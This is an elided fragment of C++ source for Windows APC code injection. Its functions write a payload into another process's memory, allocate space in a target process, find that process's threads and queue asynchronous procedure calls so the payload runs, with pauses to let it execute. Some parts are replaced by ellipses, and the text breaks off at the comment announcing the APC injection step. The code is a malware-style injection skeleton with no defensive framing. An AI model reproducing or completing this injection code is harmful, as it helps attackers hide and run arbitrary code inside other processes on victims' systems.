...
void writePayloadToProcess(HANDLE process, LPVOID address, unsigned char* payload, SIZE_T size) {
    WriteProcessMemory(process, address, payload, size, NULL);
}
...
void injectAPCIntoThreads(const std::vector<DWORD>& threadIds, LPVOID shellAddress) {
    for (DWORD threadId : threadIds) {
        ...
        Sleep(2000); // Sleep to allow the APC to execute
    }
}

int main() {
    // Create a snapshot of all processes and threads in the system
    ...
    LPVOID shellAddress = allocateMemoryInProcess(targetProcess, payloadSize);
    ...
    writePayloadToProcess(targetProcess, shellAddress, payload, payloadSize);

    // Find threads of the target process
    std::vector<DWORD> threadIds;
    findTargetThreads(threadIds, processEntry, snapshot);

    // Inject APC into threads
